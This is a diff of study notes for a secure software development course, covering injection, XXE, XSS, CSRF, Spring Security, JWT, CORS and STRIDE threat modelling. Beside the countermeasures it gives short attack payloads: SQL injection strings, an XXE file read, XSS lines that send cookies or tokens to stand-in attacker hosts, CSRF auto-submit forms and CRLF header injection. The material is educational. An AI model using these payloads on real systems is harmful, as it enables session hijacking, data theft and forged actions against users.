@@ -39,9 +39,11 @@
   - *CVE*: Common Vulnerabilities and Exposures, standard naming for public vulnerabilities (e.g., CVE-2018-0297)
 
   #inline("Defect Types")
-  - *Security Bug*: Implementation error (e.g., `gets()` no bounds check). Found by code inspection.
-  - *Security Design Flaw*: Design error (e.g., weak PRNG seed). Found by threat modelling.
-  - ~50/50 split → design matters as much as code!
+  - *Security Bug*: Localized code error → fix is surgical (one function/line)
+    - `gets()` → `fgets()`, SQL concat → prepared statement, missing null check
+  - *Security Design Flaw*: Architectural error → fix requires restructuring
+    - Plaintext passwords (need hashing + salting + migration), session ID in URL (redesign session mgmt), client-only validation (add server layer), HTTP for login (HTTPS infrastructure)
+  - ~50/50 split → design review matters as much as code review!
 
   #inline("Malware Types")
   - *Malware*: Malicious software to disrupt, gather info, or gain access
@@ -70,10 +72,13 @@
   - Fix early = 10-100x cheaper than fixing late
 
   #inline("Security Activities")
-  #image("assets/secure-development-lifecycle-security-activities.png", width: 72%)
-  1. *Security requirements*: From functional requirements, technology-agnostic (e.g., credit card transmission → require encrypted channel)
-  2. *Threat modelling* (→ finds 50% flaws): Think like attacker, identify threats → derive more security requirements (e.g., fire in server room → need data redundancy)
-  3. *Security design & controls*: Choose mechanisms for requirements (2FA, role-based access, etc.)
+  #align(center, image("assets/secure-development-lifecycle-security-activities.png", width: 60%))
+  1. *Security requirements*: *WHAT* needs protecting (abstract, tech-agnostic)
+    - Derived from functional req: "handle credit cards" → "card data protected in transit"
+  2. *Threat modelling* (→ finds 50% flaws): Think like attacker → derive more requirements
+    - "fire in server room" → "need data redundancy"
+  3. *Security design & controls*: *HOW* to fulfill requirements (concrete mechanisms)
+    - "protected in transit" → TLS 1.3 | "authorized only" → RBAC | "passwords safe" → bcrypt
   4. *Secure coding* (→ finds 50% bugs): Implement correctly, use checklists, compiler warnings
   5. *Code review*: Automated tools + manual inspection
   6. *Penetration testing*: Attack own system to verify requirements fulfilled + find bugs. Human testers more effective than automated tools
@@ -143,6 +148,7 @@
     - If app only reads first row: use `LIMIT offset,1` to select which row (e.g., ```sql ' OR 1=1 LIMIT 4,1#``` → 5th row)
   - *UNION attack*:
     1. *Find column count*: Try ```sql ' UNION SELECT 1--```, ```sql ' UNION SELECT 1,2--```, etc. until no error. Use Burp Intruder (Sniper) to automate.
+    // TODO: Match types too? Example?
     2. *Extract data*: ```sql ' UNION SELECT col1,col2,... FROM table--``` (columns must match count AND types)
   - *Schema discovery*:
     - Tables: ```sql UNION SELECT TABLE_NAME,... FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE()--```
@@ -181,9 +187,12 @@
   - *Cause*: XML parser resolves `SYSTEM` entities in DOCTYPE, fetching local files or URLs
   - *Attack*: Define entity pointing to sensitive resource → parser substitutes content
     ```xml
-    <!DOCTYPE order [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+    <!DOCTYPE order [
+      <!ENTITY xxe SYSTEM "file:///etc/passwd">
+    ]>
     <order><name>&xxe;</name></order>
     ```
+  // TODO: What is exfil?
   - *Result*: File read, SSRF (`http://localhost/admin`), or blind exfil to attacker server
   - *Counter*: Disable DTD: `dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);`
 
@@ -197,8 +206,8 @@
     - *Prerequisite*: Unlimited login attempts without account lockout
     - *Brute force*: Many passwords against ONE user (triggers lockout)
     - *Password spraying*: ONE password against MANY users (evades per-user lockout, catches weak passwords like "Password1")
-    - Burp Intruder: Capture login, mark username + password, remove Cookie header, *Cluster bomb* attack
     - Find valid credentials: Look for *outliers* (different status code or response length)
+    // TODO: Why not lock accounts?
     - *Counter*: Rate limiting (e.g., 60s delay after 3 failures). Do NOT lock accounts → enables DoS (Denial of Service). Enforce password quality + check against common password lists
   - *Password reset*: Security questions often guessable/findable, can chain weak resets across providers
     - *Counter*: No self-service reset for high-value apps, hard security questions, temp password/link to registered email (valid once, short expiry)
@@ -214,60 +223,65 @@
   - *Counter*: Long random IDs (≥128 bits), *change on login*, cookies only (not URL), timeout.
 
   #inline("XSS (Cross-Site Scripting)")
-  *Core idea*: Attacker injects JS code into web page viewed by other users → JS executes in victim's browser
+  *Core idea*: Attacker injects JS into a web page → executes in victim's browser with full page access
 
-  - *Attack possibilities*: Steal cookies (`document.cookie`), steal tokens (`localStorage.getItem('token')`), fake login form, send requests in victim's session
-  - *POST via XSS*: Hidden form + auto-submit (`document.forms[0].submit()`)
-  - *Testing*: ```js <script>alert("XSS");</script>``` → if popup appears, vulnerable
-  - *Exfiltration*: `<script>fetch('https://attacker/x?c='+document.cookie)</script>` or with `localStorage.getItem('token')`
+  #subinline("XSS Types")
+  - *Reflected (Server)*: Payload in URL param → server echoes back unsanitized → victim must click link
+    - Example: `search?q=<script>...</script>`
+  - *Stored (Server)*: Payload persisted in DB (comment, profile) → served to all users → no click needed
+  - *DOM-based (Client)*: Server never sees payload → client JS reads URL/DOM unsafely
+    - `#` fragment never sent to server → WAF/logs can't detect
+    - Example: `page#<img src=x onerror="...">`
 
-  #subinline("Reflected (Server) XSS")
-  - Victim clicks link with JS in parameter → server reflects JS back → browser executes it
-  - Example: `http://xyz.com/search?q=<script>...</script>`
-  - *Requires*: App doesn't validate input AND doesn't sanitize output
+  #subinline("What XSS Can Do")
+  - *Session hijacking*: Steal cookies via `document.cookie` (unless HttpOnly)
+  - *Token theft*: `localStorage.getItem('token')` → full account takeover
+  - *Exfiltration*: Send stolen data to attacker server: `fetch('https://evil?c='+document.cookie)`
+  - *Session riding*: Make requests as victim (browser auto-attaches cookies even if HttpOnly)
+  - *Phishing*: Inject fake login form, capture credentials
+  - *Keylogging*: `document.onkeypress` captures all input
 
-  #subinline("Stored (Server) XSS")
-  - Attacker stores JS permanently in app (forum post, comment, profile)
-  - Victim views page → JS executes (no link click needed)
-
-  #subinline("XSS Countermeasures")
-  - *Output sanitization* (primary): Replace `<` `>` `"` with `&lt;` `&gt;` `&quot;`
-  - *Input validation*: Reject/filter JS in input (but not always possible)
-  - *HttpOnly cookie flag*: Blocks `document.cookie` access (XSS can still send requests - browser auto-attaches cookies)
-  - *Browser XSS Auditor*: Detects if response contains same JS as request (Chrome, Edge, Safari - NOT Firefox)
-  - *CSP (Content Security Policy)*: Specify allowed sources for scripts
-    - `Content-Security-Policy: default-src 'self'; script-src scripts.example.com`
-    - Embedded JS not executed → must load from external files → attacker can't inject inline scripts
-
-  #subinline("Token Storage & XSS")
-  - *HttpOnly cookies*: JS cannot read (`document.cookie` blocked), but XSS can still *send* requests (browser auto-attaches)
-  - *localStorage/sessionStorage*: Always accessible to JS → XSS = instant token theft
-  - *Where to store*: SSR → HttpOnly cookies (session-based). REST API → sessionStorage (private per tab, no CSRF). Avoid localStorage (persists, shared).
-  - *Authorization header*: `Authorization: Bearer <token>` sent manually by JS → not auto-attached like cookies → immune to CSRF
-
-  #subinline("DOM-based XSS")
-  - Server NOT involved → client JS reads untrusted data (URL, DOM) and processes insecurely
-  - *`#` fragment*: Attacker puts JS after `#` in URL → *never sent to server* → WAF/logging can't detect it
-    - Example: `https://target/page#<img src=x onerror="fetch('https://attacker?c='+document.cookie)">`
-  - *Dangerous sinks*: `eval()`, `setTimeout(string)`, `innerHTML`, `document.write()`
-  - *Counter*: Avoid `eval()`, use `textContent` instead of `innerHTML`, validate/sanitize in client-side JS
-
-  #subinline("SVG XSS")
-  SVG is XML and can contain `<script>` tags. If app serves uploaded SVGs, scripts execute on render.
-  ```xml
-  <?xml version="1.0"?>
-  <svg xmlns="http://www.w3.org/2000/svg">
-    <script>fetch('https://attacker?t='+localStorage.getItem('token'))</script>
-  </svg>
-  ```
-  - Fix: Strip scripts from SVGs, serve as `Content-Disposition: attachment`, or convert to PNG
+  #subinline("Attack Payloads")
+  - *Basic test*: `<script>alert(1)</script>` → if popup appears, vulnerable
+  - *Cookie steal*: `<script>fetch('https://evil?c='+document.cookie)</script>`
+  - *POST request*: Hidden form + `document.forms[0].submit()` or `fetch()` with body
 
   #subinline("Filter Bypass Techniques")
-  Many filters block `<script>` but miss event handlers and alternative vectors:
-  - `<img src=x onerror="...">` → fires when image fails to load
-  - `<input onfocus="..." autofocus>` → fires immediately on page load
-  - `<svg onload="...">`, `<body onload="...">`, `<marquee onstart="...">`
-  - Token theft via `<img>` bypasses CORS: `<img src="https://evil.com?c="+document.cookie>` (images load cross-origin)
+  Filters blocking `<script>` often miss:
+  - *Event handlers*: `<img src=x onerror="...">`, `<input onfocus="..." autofocus>`
+  - *Other tags*: `<svg onload="...">`, `<body onload="...">`, `<marquee onstart="...">`
+  - *CORS bypass*: `<img src="https://evil?c="+cookie>` → images load cross-origin (no fetch needed)
+  - *SVG files*: SVG is XML → can embed `<script>` → executes when browser renders it
+
+  #subinline("Dangerous DOM Sinks")
+  Client-side code that executes attacker-controlled strings:
+  - *Code execution*: `eval()`, `setTimeout(string)`, `setInterval(string)`, `new Function(string)`
+  - *HTML injection*: `innerHTML`, `outerHTML`, `document.write()`, `insertAdjacentHTML()`
+
+  #subinline("Countermeasures")
+  - *Output encoding* (primary): Context-aware escaping (`<` → `&lt;`, `"` → `&quot;`)
+  - *Input validation*: Whitelist allowed chars, reject suspicious patterns
+  - *HttpOnly cookies*: Blocks `document.cookie` (XSS can still make requests, but can't exfiltrate session)
+  - *CSP (Content Security Policy)*: HTTP header defining allowed script sources
+    - `script-src 'self'` → external JS from same origin allowed, *inline scripts blocked*
+    - External `<script src="/app.js">` works, inline `<script>...</script>` and `onclick="..."` blocked
+    - Stops XSS because injected inline code won't execute (browser can't distinguish attacker vs legitimate inline)
+  - *DOM safety*: Use `textContent` not `innerHTML`, avoid `eval()`
+  - *SVG handling*: Strip scripts, serve as `Content-Disposition: attachment`, or convert to raster
+
+  #subinline("Token Storage Tradeoffs")
+  Core tradeoff: *XSS protection vs CSRF protection* - you can't have both perfectly.
+
+  - *HttpOnly cookie*:
+    - XSS can't *read* token (`document.cookie` blocked)
+    - XSS can still *use* token (browser auto-attaches to requests)
+    - Vulnerable to CSRF (attacker site triggers request → cookie sent)
+    - Mitigate CSRF with `SameSite=Strict` + CSRF tokens
+  - *sessionStorage / localStorage*:
+    - Both: XSS = instant token theft (JS reads via `getItem()`)
+    - Both: Immune to CSRF (token sent via `Authorization: Bearer` header, not auto-attached)
+    - sessionStorage: per-tab, clears on close → limits blast radius
+    - localStorage: persists forever, shared across tabs → worse
 
   #inline("Broken Access Control")
   #subinline("Function Level")
@@ -283,29 +297,46 @@
   - *Counter*: Verify user owns object on every request; derive IDs from session instead of exposing in params
 
   #inline("CSRF (Cross-Site Request Forgery)")
-  Force authenticated user to execute unwanted action. Browser attaches cookies regardless of link source.
-  - *GET*: `<img src="https://shop.com/transfer?to=attacker" width="1" height="1">`
-  - *POST*: Hidden form + `document.forms[0].submit()` in zero-size iframe, or `fetch()` with `credentials: "include"`
-  - *Multi-step*: `fetch()` + `async/await` chains requests
+  Force authenticated user to execute unwanted action. Browser attaches cookies regardless of request origin.
+  - *GET*: `<img src="https://bank.com/transfer?to=attacker&amt=1000">` → executes on page load
+  - *POST*: Hidden form auto-submits when victim visits attacker's page:
+    ```html
+    <form action="https://bank.com/transfer" method="POST" id="f">
+      <input type="hidden" name="to" value="attacker">
+      <input type="hidden" name="amount" value="1000">
+    </form>
+    <script>document.getElementById('f').submit()</script>
+    ```
+  - *Fetch variant*: `fetch(url, {method:'POST', credentials:'include', body:...})`
   - *Counter*:
-    - CSRF token: Random per-user token in session, include in requests, server compares
-    - SameSite cookie: `None` (all) | `Lax` (GET only, default) | `Strict` (never) → still use CSRF tokens!
+    - *CSRF token*: Server generates random token, stores in session. Embedded as `<input type="hidden" name="csrf" value="xyz">` or `X-CSRF-Token` header. Server validates token matches session. Works because attacker can *send* requests cross-origin but can't *read* responses (Same-Origin Policy) → can't steal the token.
+    - *SameSite cookie*: `Lax` (default) = GET allowed, rest blocked (POST, PUT, etc.) | `Strict` = all cross-site blocked | `None` = always sent
+    - *Why tokens + SameSite?* Lax still allows GET (bad if app has state-changing GETs), old browsers ignore SameSite, defense in depth
 
   #inline("Testing Tools")
+  Tools find *low-hanging fruit* only: simple technical vulns (SQLi, XSS, CSRF, cookie attrs, info leakage). They miss anything requiring "intelligence" to exploit.
+
   #subinline("Dynamic (Vulnerability Scanners)")
-  Crawls running app → sends attack patterns → analyzes response
-  - *ZAP*: Detects SQLi, XSS, missing CSRF tokens, cookie attributes
-  - *Limit*: Only tests what crawler finds; struggles with forms; auth/state issues
+  Crawls running app → sends attack → analyzes response (e.g., ZAP)
+  - *Pros*: Tech-agnostic (any web app), no source needed, provides PoC exploit, detects cookie attrs + response leaks directly
+  - *Cons*: Only tests what crawler finds, struggles with auth/forms/state, state changes during scan affect results
 
   #subinline("Static (Code Analyzers)")
-  Analyzes source code or bytecode without running app
-  - *Fortify*: Source code - detects CSRF, info leaks, hardcoded passwords
-  - *SpotBugs*: JAR bytecode (Java only)
-  - *Limit*: Must understand framework (may miss SQLi/XSS)
+  Analyzes source/bytecode without running app (e.g., Fortify, SpotBugs)
+  - *Pros*: 100% code coverage, IDE integration, shows exact offending line, finds hardcoded passwords + insecure functions
+  - *Cons*: Language/framework must be supported, few good free tools, must understand framework patterns
 
-  Both miss logic vulnerabilities (access control, param tampering) → manual testing required
+  #subinline("What Tools Miss")
+  Logic vulnerabilities require manual testing:
+  - Access control flaws (viewing other users' data)
+  - Insecure password reset flows
+  - Parameter tampering (negative quantity → negative price)
+  - Business logic abuse
+
+  *Recommendation*: Use both tool types for coverage, but *manual testing is king* for real security
 ])
 
+// TODO: go through
 = Buffer Overflow & Race Conditions (SDL 4)
 
 #concept-block(body: [
@@ -556,6 +587,7 @@
   - Don't try fixing invalid data → just reject it
 ])
 
+// TODO: Go through
 = Java Security (SDL 4)
 
 #concept-block(body: [
@@ -746,19 +778,33 @@
   #inline("SQL Injection Prevention")
   *Never* string concatenation. Use *prepared statements* → query parsed first, then values bound as data (never code).
   ```java
-  String sql = "SELECT * FROM Product WHERE desc LIKE ?";
-  jdbcTemplate.query(sql, mapper, "%" + desc + "%"); // safe - '?' escaped
+  String sql = "SELECT * FROM users WHERE name = ? AND role = ?";
+  jdbcTemplate.query(sql, mapper, name, role); // safe - ? bound as data
   ```
 
   #inline("JPA (Jakarta Persistence API)")
   ORM framework: maps objects ↔ database tables. *Prevents SQLi* when used correctly.
-  - *Entity classes:* `@Entity`, `@Table(name="Product")`, `@Id` for primary key
+  - *Entity:* `@Entity` + `@Table(name="...")` maps class to table, `@Id` marks primary key
+    ```java
+    @Entity @Table(name="users")
+    public class User {
+        @Id private Long id;
+        private String name;
+        private String role;
+    }
+    ```
   - *JPQL:* Query language for entities. Use *named parameters* (`:param`) not string concat!
     ```java
-    @Query("SELECT p FROM Product p WHERE p.desc LIKE CONCAT('%', :desc, '%')")
-    List<Product> findByDesc(@Param("desc") String desc); // safe
+    @Query("SELECT u FROM User u WHERE u.name = :name AND u.role = :role")
+    List<User> findByNameAndRole(@Param("name") String name, @Param("role") String role);
     ```
-  - *CrudRepository:* Auto-generates safe queries: `findById()`, `save()`, `delete()`, `findByDescriptionContaining(String)` = auto LIKE
+  - *CrudRepository:* Auto-generates safe queries from method names:
+    ```java
+    public interface UserRepository extends CrudRepository<User, Long> {
+        List<User> findByName(String name);
+        List<User> findByNameAndRole(String n, String r);
+    }
+    ```
   - *Danger:* `EntityManager` + string concatenation or native queries = *SQLi possible!*
 
   #inline("Secure Password Storage")
@@ -773,33 +819,33 @@
   @Service class UserService implements UserDetailsService {
     public UserDetails loadUserByUsername(String u) { /*load from DB*/ }
   }
-  // SecurityConfig beans:
+
+  @Bean PasswordEncoder pwEncoder() { return new BCryptPasswordEncoder(); }
+
   @Bean AuthenticationManager authManager() {
     var p = new DaoAuthenticationProvider();
     p.setUserDetailsService(userService); p.setPasswordEncoder(pwEncoder());
     return new ProviderManager(p);
   }
-  @Bean PasswordEncoder pwEncoder() { return new BCryptPasswordEncoder(); }
   ```
 
   #inline("Authentication Mechanisms")
+  // TODO: restructure?
   #subinline("HTTP BASIC")
   Server returns 401 → browser shows dialog → credentials in `Authorization: Basic <base64>` header on *every* request. \
   *Limitation:* No logout without closing browser (credentials cached).
 
   #subinline("FORM-based (Preferred)")
-  Login form submits to server → on success, stores user/role in session → session ID in cookie. \
-  *Always POST* (GET exposes password in URL/logs). Logout via POST to `/logout` destroys session.
+  - *Flow:* Form POST → server validates → stores user/role in session → session ID in cookie
+  - *Always POST:* GET exposes password in URL/logs
+  - *Logout:* POST to `/logout` destroys session
+  - *Form requirements:* `action="/public/login"`, `method="POST"`, params: `username`, `password`
   ```java
-  http.formLogin(f -> f.loginPage("/public/login").failureUrl("/public/login?error=true").permitAll())
+  http.formLogin(f -> f.loginPage("/public/login")
+          .failureUrl("/public/login?error=true").permitAll())
       .logout(l -> l.logoutSuccessUrl("/public/products?logout=true"));
   ```
-  *Login form requirements:* action=`/public/login`, params: `username`, `password`.
 
-  #subinline("Username Enumeration")
-  Different error messages reveal if user exists → enables targeted attacks.
-  - "Unknown user" vs "Wrong password" → attacker learns valid usernames
-  - *Fix*: Generic message for all failures: "Invalid credentials"
 
   #subinline("Login Throttling")
   Prevent brute-force/password spraying. Strategy effectiveness:
@@ -817,13 +863,13 @@
   #inline("Role-Based Access Control")
   Define roles → assign to users → map roles to resources in `SecurityConfig`.
   ```java
-  .requestMatchers("/admin/deletepurchase/*").hasRole("SALES") // more specific first!
+  .requestMatchers("/admin/deletepurchase/*").hasRole("SALES")
   .requestMatchers("/admin/**").hasAnyRole("MARKETING", "SALES")
   ```
   *URL patterns:* `/admin/*` = direct children only, `/admin/**` = all descendants.
 
   #subinline("Method-Level Security")
-  Alternative to SecurityConfig rules: `@EnableMethodSecurity` in config class, then:
+  Alternative to SecurityConfig: `@EnableMethodSecurity` in config class, then:
   ```java
   @PreAuthorize("hasRole('SALES')") // or combine with method params:
   @PreAuthorize("hasRole('USER') and #userId == authentication.principal.id")
@@ -839,10 +885,13 @@
   - *Fix*: Use DTOs with only allowed fields, explicit mapping in service layer
   ```java
   // WRONG: binds ALL fields including "role"
-  public void update(@RequestBody User user) { userRepo.save(user); }
+  public void update(@RequestBody User user) {
+    userRepo.save(user);
+  }
+
   // RIGHT: DTO with only allowed fields
   public void update(@RequestBody UserUpdateDTO dto) {
-    user.setAddress(dto.getAddress()); // explicit mapping
+    user.setAddress(dto.getAddress());
   }
   ```
 
@@ -853,7 +902,6 @@
   ```
   Server compares received token with session token. Attacker can't guess token → CSRF blocked.
 
-  *SameSite:* `Lax` (default) blocks POST CSRF but not GET → *never use GET for state changes!* \
   Use *both* CSRF tokens AND SameSite for defense in depth.
 
   #inline("Secure Session Handling")
@@ -867,10 +915,6 @@
 
   #subinline("Session Fixation")
   Spring Security *automatically rotates session ID after login* (only with built-in auth, not custom login!).
-
-  #subinline("Logout")
-  POST to `/logout` destroys session, creates new anonymous session. Configure redirect:
-  `.logout(l -> l.logoutSuccessUrl("/public/products?logout=true"))`
 
   ```toml
   # application.properties
@@ -913,12 +957,10 @@
   *Controller:* `@Valid` triggers validation, `BindingResult` captures errors.
   ```java
   public String save(@ModelAttribute @Valid Purchase p, BindingResult result) {
-    if (result.hasErrors()) { return "checkout"; } // show form again with errors
+    if (result.hasErrors()) { return "checkout"; }
+  }
   ```
   *Template:* `th:if="${#fields.hasErrors('firstname')}"` + `th:errors="*{firstname}"`
-
-  #subinline("Custom Validation")
-  Create annotation with `@Constraint(validatedBy = MyValidator.class)` + class implementing `ConstraintValidator<AnnotationType, FieldType>` with `isValid()` method.
 
   #subinline("Input Bounds (DoS Prevention)")
   Unbounded input causes `OutOfMemoryError` → attacker sends huge data, server allocates memory until crash. Must limit *both* individual item size AND total count.
@@ -931,23 +973,9 @@
   *Why `-Xmx` doesn't help*: Increasing heap just delays crash → attacker can always send more. Root cause is unbounded allocation, not heap size.
 
   *Defense pattern*:
-  - Set hard limits: max line length (1000 chars), max lines (1000), max file size (10MB)
-  - Validate request format early: `^(GET|PUT) [\\x21-\\x7E]+$` rejects malformed requests before parsing
+  - Set hard limits: max line length (chars), max lines, max file size
+  - Validate request format early (e.g., `^(GET|PUT) [\\x21-\\x7E]+$` rejects malformed requests before parsing)
   - Fail fast: Reject oversized input immediately, don't try to process partial data
-
-  *Bounded line reading* (prevents OOM from `readLine()`):
-  ```java
-  String readLineMaxChar(Reader r, int max) throws IOException {
-    StringBuilder sb = new StringBuilder();
-    int ch;
-    while ((ch = r.read()) != -1) {
-      if (ch == '\n') return sb.toString();
-      if (sb.length() >= max) throw new IOException("Line too long");
-      sb.append((char) ch);
-    }
-    return sb.length() > 0 ? sb.toString() : null;
-  }
-  ```
 
   #subinline("Path Traversal")
   Attacker uses `../` to escape intended directory: `/files/../../../etc/passwd`
@@ -973,7 +1001,9 @@
   Input validation alone may not prevent attacks if app decodes data later.
   - Attacker encodes `<script>` as `%3Cscript%3E` (URL encoding) → passes validation (only letters/digits/%)
   - If app URL-decodes before output → XSS possible
-  - *Best practice:* Don't decode, or decode first then validate. Sanitation (encode `<` → `&lt;`) is primary defense.
+  - *Best practice:*
+    - *Input*: Decode first, then validate (so `%3C` becomes `<` before check)
+    - *Output*: HTML-encode before rendering (`<` → `&lt;`) - primary XSS defense
 
   #subinline("SSRF (Server-Side Request Forgery)")
   Server fetches user-supplied URL → attacker accesses internal services not exposed to internet.
@@ -987,18 +1017,22 @@
   - *Fix*: Whitelist allowed domains, block ALL private IP ranges (10.x, 172.16-31.x, 192.168.x, 127.x, 169.254.x)
 
   #subinline("CRLF Injection / HTTP Response Splitting")
-  HTTP headers are separated by CRLF (`\r\n`). If user input is included in response headers without sanitization, attacker can inject `%0d%0a` to add arbitrary headers.
+  HTTP headers separated by CRLF (`\r\n`). User input in response headers → attacker injects `%0d%0a` to add arbitrary headers.
 
-  *How it works*: HTTP response structure is `Status\r\nHeader1\r\nHeader2\r\n\r\nBody`. Injecting CRLF lets attacker terminate current header and start new one.
-  - Redirect parameter: `url=/secure/` becomes header `Location: /secure/`
-  - Injected: `url=/secure/%0d%0aSet-Cookie:admin=true`
-  - Result: `Location: /secure/\r\nSet-Cookie:admin=true` → browser sets attacker's cookie!
+  *Example*: Redirect endpoint reflects user input in `Location` header:
+  ```
+  Normal:   GET /redirect?url=/home
+  Response: HTTP/1.1 302 Found
+            Location: /home
 
-  *Cookie injection*: Attacker injects auth cookies to impersonate admin.
-  - Payload: `%0d%0aSet-Cookie:session=admin_token`
-  - Server reflects headers → browser stores cookie → next request authenticated as admin
+  Attack:   GET /redirect?url=/home%0d%0aSet-Cookie:admin=true
+  Response: HTTP/1.1 302 Found
+            Location: /home
+            Set-Cookie:admin=true    ← injected header!
+  ```
+  Browser now has attacker-controlled cookie. Can inject session tokens, XSS via body, etc.
 
-  *Fix*: Strip or reject `\r`, `\n`, `%0d`, `%0a` from any input used in headers/redirects.
+  *Fix*: Strip/reject `\r`, `\n`, `%0d`, `%0a` from any input used in headers.
 
   #subinline("File Upload Path Traversal")
   Server saves uploaded file using client-provided filename without validation. Attacker includes `../` to write outside upload directory → potentially into webroot where files are executed.
@@ -1019,20 +1053,6 @@
 #concept-block(body: [
   #inline("REST API Security")
   *Stateless* = no server-side sessions. Every request must carry auth token (JWT). This changes the threat model: no session fixation, but token theft/forgery becomes primary risk.
-
-  #subinline("Spring REST Controller")
-  ```java
-  @RestController  // returns JSON, not templates
-  @RequestMapping("/rest")
-  public class Controller {
-      @GetMapping("/products")
-      public List<Product> get() { ... }  // returns JSON array
-      @PostMapping(value = "/purchases", consumes = APPLICATION_JSON_VALUE)
-      public void post(@RequestBody @Valid Checkout c) { ... }  // JSON → DTO
-      @DeleteMapping("/purchases/{id}")
-      public void delete(@PathVariable int id) { ... }  // URL param
-  }
-  ```
 
   #subinline("IDOR (Insecure Direct Object Reference)")
   API uses predictable IDs (sequential integers) to reference resources, but doesn't verify the requester is authorized to access that specific resource. Having a valid JWT proves *identity*, not *authorization* for every resource.
@@ -1087,34 +1107,24 @@
     - Fix: Whitelist allowed algorithms, reject "none"
   - *Weak Secret*: Short secrets crackable offline with hashcat/john (`-m 16500`)
     - Fix: Use ≥256-bit random secret (`openssl rand -base64 32`)
-  - *Token Leakage*: Exposed in docs/logs/git history → Use short-lived tokens (15-30 min)
-
-  #inline("Exception Handling")
-  - *401 Unauthorized*: `CustomAuthenticationEntryPoint` (missing/invalid JWT)
-  - *403 Forbidden*: `CustomAccessDeniedHandler` (valid JWT but wrong role)
-  - *400 Bad Request*: `GlobalExceptionHandler` (`@RestControllerAdvice`)
-    - `InvalidParameterException`, `MethodArgumentNotValidException`, `ConstraintViolationException`, `MethodArgumentTypeMismatchException`
-
-  *Throwing exceptions in code*:
-  ```java
-  throw new AccessDeniedException("");        // → 403 Forbidden
-  throw new InvalidParameterException("msg"); // → 400 Bad Request
-  throw new RuntimeException("msg");          // → 500 Internal Server Error
-  ```
+  - *Token Leakage*: Exposed in docs/logs/git history → Use short-lived tokens
 
   #inline("SecurityConfig for REST")
+  Key differences from session-based: stateless (no session), CSRF disabled (token in header not cookie), JWT filter added.
   ```java
-  http.sessionManagement(s -> s.sessionCreationPolicy(STATELESS))  // no sessions
-      .csrf(csrf -> csrf.disable())  // JWT in header, not cookies → no CSRF risk
-      .addFilterBefore(jwtFilter, ...)  // JWT filter runs first in chain
-      .exceptionHandling(e -> e.accessDeniedHandler(...).authenticationEntryPoint(...))
-      .cors(Customizer.withDefaults());  // enable CORS
+  http.sessionManagement(s -> s.sessionCreationPolicy(STATELESS))
+      .csrf(csrf -> csrf.disable()) // JWT in header → no CSRF
+      .addFilterBefore(jwtFilter, UsernamePasswordAuthFilter.class)
+      .exceptionHandling(e -> e
+          .accessDeniedHandler(adh)
+          .authenticationEntryPoint(aep))
+      .cors(Customizer.withDefaults());
   ```
 
   #inline("CORS (Cross-Origin Resource Sharing)")
   - *Origin* = protocol + host + port (all three must match!)
-  - *Simple requests* (GET/POST, no auth header, no JSON): browser allows by default
-  - *Non-simple requests* (DELETE, Authorization header, JSON): need CORS config
+  - *Simple requests*: GET, HEAD, POST with form data → browser allows cross-origin
+  - *Non-simple requests*: PUT, DELETE, PATCH, or `Authorization` header, or `application/json` → needs CORS config
 
   #subinline("Preflight Requests")
   Browser sends `OPTIONS` first to ask if request is allowed:
@@ -1133,16 +1143,17 @@
 
   #subinline("CORS Config")
   ```java
-  config.setAllowedOrigins(Arrays.asList("https://localhost:8081")); // NOT "*"!
-  config.setAllowedMethods(Arrays.asList("OPTIONS", "GET", "POST", "DELETE"));
+  config.setAllowedOrigins(Arrays.asList("https://localhost:8081"));
+  config.setAllowedMethods(Arrays.asList("OPTIONS", "GET", "POST"));
   config.setAllowedHeaders(Arrays.asList("*"));
   config.setAllowCredentials(true); // Only if cookies needed!
   ```
 
   #subinline("Access-Control-Allow-Credentials")
-  *Only needed when JS uses* `credentials: 'include'` (to send cookies cross-origin):
-  - Without it: JS can read *public* data (no cookies sent, unauthenticated)
-  - With it: JS can read *private* data (cookies sent, authenticated as victim!)
+  Same-origin requests: cookies always sent (no CORS involved). \
+  Cross-origin with `credentials: 'include'`:
+  - Without header: cookies NOT sent, JS reads public data only
+  - With header: cookies sent, JS reads authenticated data as victim!
   - Cannot use with `Access-Control-Allow-Origin: *` (browser blocks this combo)
   - *Attack*: If server reflects any origin + allows credentials → attacker reads victim's authenticated data
 
@@ -1163,11 +1174,17 @@
   - JWT in session storage = not accessible from different origin → CSRF blocked
 
   #subinline("CSRF Content-Type Bypass")
-  `Content-Type: text/plain` = "simple request" → *no CORS preflight*!
-  - Server may still parse body as JSON despite wrong Content-Type
-  - Attack: `fetch(url, {method:'POST', mode:'no-cors', credentials:'include', headers:{'Content-Type':'text/plain'}, body:JSON.stringify(data)})`
-  - `mode:'no-cors'` = don't read response (avoids CORS block), `credentials:'include'` = send victim's cookies
-  - *Fix*: Validate Content-Type header server-side, use SameSite cookies
+  `Content-Type: text/plain` = simple request → no preflight! Server may still parse as JSON.
+  ```js
+  fetch(url, {
+    method: 'POST',
+    mode: 'no-cors',        // don't read response (avoids CORS block)
+    credentials: 'include', // send victim's cookies
+    headers: {'Content-Type': 'text/plain'},
+    body: JSON.stringify(data)
+  })
+  ```
+  *Fix*: Validate Content-Type server-side, use SameSite cookies.
 
   #subinline("XSS in SPAs")
   - *Server XSS*: Not an issue (no HTML generated server-side in pure SPAs)
@@ -1216,7 +1233,6 @@
   - Source: artifacts + interviews with engineers
 
   #subinline("3. Decompose System (DFD)")
-  DFD (Data Flow Diagram) Elements:
   #grid(
     columns: 6,
     gutter: 4pt,
@@ -1237,9 +1253,6 @@
   - *Data Flow*: Direction of data movement between components
   - *Trust Boundary*: Components that should NOT auto-trust each other → security-critical areas
 
-  High-level DFD example:
-  #image("assets/dfd-example.png", width: 100%)
-
   #subinline("4. Identify Threats (STRIDE)")
   - #strong[S]poofing: Pretend to be someone/something else
   - #strong[T]ampering: Modify data or code (at rest or in transit)
@@ -1259,10 +1272,59 @@
   - If risk too high → vulnerability identified
   - Define new security requirements to reduce risk to acceptable level
 
+  #inline("STRIDE Examples")
+
+  #subinline("University Library")
+  #image("assets/dfd-example-university-library.png", width: 100%)
+  *External Entity: Librarians*
+  - *T1 (S)*: Guess shared credentials → Personal accounts + strong pw
+  - *T2 (R)*: Untraceable (shared account) → Personal accounts + logging
+
+  *Data Flow: Request from Students/Staff*
+  - *T3 (I)*: Credentials readable in transit → HTTPS (covered)
+  - *T4 (T)*: Data modified in transit → HTTPS (covered)
+  - *T5 (D)*: Flood network → Accepted risk (not high-availability)
+
+  *Data Store: Web resources on disk*
+  - *T6 (T)*: Modify files via app vuln (defacement) → No direct OS access
